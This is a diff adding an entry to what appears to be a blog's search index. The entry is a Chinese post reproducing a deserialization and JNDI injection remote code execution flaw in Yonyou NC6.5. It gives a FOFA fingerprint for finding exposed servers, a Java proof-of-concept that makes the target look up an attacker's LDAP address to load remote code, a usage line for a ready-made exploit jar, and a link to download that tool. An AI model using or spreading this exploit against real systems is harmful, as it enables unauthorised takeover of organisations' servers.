@@ -1447,4 +1447,29 @@
         <tag>Poc</tag>
       </tags>
   </entry>
+  <entry>
+    <title>用友NC6.5反序列化JNDI注入远程代码执行复现</title>
+    <url>/2021/01/25/%E7%94%A8%E5%8F%8BNC6-5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96JNDI%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h1><p>用友NC6.5版本中存在JAVA反序列化远程命令执行漏洞。<a id="more"></a>2020年中的漏洞，虽然是老漏洞，但我感觉修的不多。</p>
+<h1 id="指纹"><a href="#指纹" class="headerlink" title="指纹"></a>指纹</h1><p>FOFA：title=”YONYOU NC”</p>
+<p>ICONHASH：1085941792</p>
+<p>长得像这样，这个最近还出了一个文件上传的漏洞。</p>
+<p><img src="/images/NC6.5-2.jpg" alt="NC6.5-2"></p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>我是个菜菜，代码分析略</p>
+<h1 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h1><p>根据<a href="https://blog.sari3l.com/posts/608d18f0/">https://blog.sari3l.com/posts/608d18f0/</a> 的poc代码如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import nc.bs.framework.common.NCLocator;</span><br><span class="line"></span><br><span class="line">import java.util.Properties;</span><br><span class="line"></span><br><span class="line">public class poc &#123;</span><br><span class="line"></span><br><span class="line">    public static void attack(String url, String jndipath) &#123;</span><br><span class="line">        Properties env &#x3D; new Properties();</span><br><span class="line">        if (!url.startsWith(&quot;http&quot;)) &#123;</span><br><span class="line">            url &#x3D; &quot;http:&#x2F;&#x2F;&quot; + url;</span><br><span class="line">        &#125;</span><br><span class="line">        env.put(&quot;SERVICEDISPATCH_URL&quot;, url + &quot;&#x2F;ServiceDispatcherServlet&quot;);</span><br><span class="line">        NCLocator locator &#x3D; NCLocator.getInstance(env);</span><br><span class="line">        locator.lookup(jndipath);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        attack(&quot;http:&#x2F;&#x2F;target&quot;, &quot;ldap:&#x2F;&#x2F;ip:port&#x2F;classname&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>简单生成了一个jar利用工具，效果看图，言简意骇。</p>
+<p>java -jar NC.jar 目标系统URL LDAP/RMI服务地址</p>
+<p><img src="/images/NC6.5.jpg" alt="NC6.5"></p>
+<p><img src="/images/NC6.5-1.jpg" alt="NC6.5-1"></p>
+<p>工具下载地址：</p>
+<p><a href="https://zxc12609.github.io/dL/NC6.5_JDNI_RCE.jar">点我下载</a></p>
+]]></content>
+      <categories>
+        <category>用友NC</category>
+      </categories>
+      <tags>
+        <tag>Poc</tag>
+      </tags>
+  </entry>
 </search>
